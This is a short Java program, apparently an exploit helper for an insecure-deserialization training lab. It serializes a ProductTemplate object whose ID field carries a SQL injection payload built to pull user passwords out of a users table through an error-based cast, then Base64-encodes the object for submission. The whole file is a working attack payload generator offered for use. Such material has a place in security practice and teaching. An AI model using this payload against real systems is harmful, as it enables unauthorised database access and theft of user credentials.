import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

import data.productcatalog.*;



class deser_java{
    public static void main(String[] args)throws Exception{
        ProductTemplate originalObject = new ProductTemplate("1' UNION SELECT NULL, NULL, NULL, cast(password as numeric), NULL, NULL, NULL, NULL FROM users-- -");
        String serializeObject = serialize(originalObject);

        System.out.println("Serialize Object: " + serializeObject);

        ProductTemplate productTemplate = deserialize(serializeObject);

        System.out.println("Deserialized object ID: "+ productTemplate.getId());

    }

    private static String serialize(Serializable obj) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try(ObjectOutputStream out = new ObjectOutputStream(baos)){
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());

    }

    private static <T> T deserialize(String base64Serializeobject) throws Exception{
        try(ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64Serializeobject)))){
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }

}